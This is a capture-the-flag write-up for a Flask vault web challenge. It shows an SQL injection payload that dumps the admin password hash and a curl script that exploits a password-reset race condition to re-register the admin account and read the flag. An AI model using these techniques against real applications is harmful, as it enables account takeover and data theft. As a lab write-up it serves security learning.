# labyrinth

[library.m0unt41n.ch/challenges/labyrinth](https://library.m0unt41n.ch/challenges/labyrinth) ![](../../resources/web.svg) ![](../../resources/baby.svg) 

# TL;DR

Simple Flask vault app, with multiple forms on one page. We can register, login, store
and retrieve values by a key.

# Analysis

The flag can be retrieved by getting `flag` when logged as `admin` user, that has a
random password initialized at program start.

There actually two data storages:

*   One is `key_value_store[]` hash, which starts with
    `"admin::flag": "flag{can_you_extract_me?}"` entry.
*   Another is `ARTICLES` table in SQLite, used by `/search` and `/admin_search`
    endpoints. The "search" is just retrieve by ID.

Some other interesting facts:

*   We can register as any non-existing user, and if the name starts with `admin`
    the `is_admin` flag is set (and we can do `/admin_search`).
*   While `/search` validates the `query` parameter integer, `/admin_search` does
    not, which enables SQL injection. For example,
    `"nope" union select username,hex(password),is_admin from users where username="admin"`
    gives us hash of the password - but it's too strong to crack (geneerated
    from 24 hex digits)).

Finally, `/reset_password` endpoint looks fishy:

```python
new_password = secrets.token_hex(16)
send_new_password_to(username, new_password)
insert_user(username, new_password, is_admin)
```

... where `send_new_password_to()` is just a `time.sleep(2)`.

So, we have two seconds where the user being "reset" does not exist. So, we
can re-register it. And that can be **any** user...


# Getting the flag

```bash
#!/bin/bash
URL="http://localhost:5000"
curl -s -o /dev/null "$URL/reset_password?username=admin" &
sleep 1
curl -s -o /dev/null "$URL/register?username=admin&password=admin"
curl -s -c cookies -o /dev/null "$URL/login?username=admin&password=admin"
curl -s -b cookies "$URL/get?key=flag"
```

---

## `flag{s0o0o0o_many_ways_to_the_flag!}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
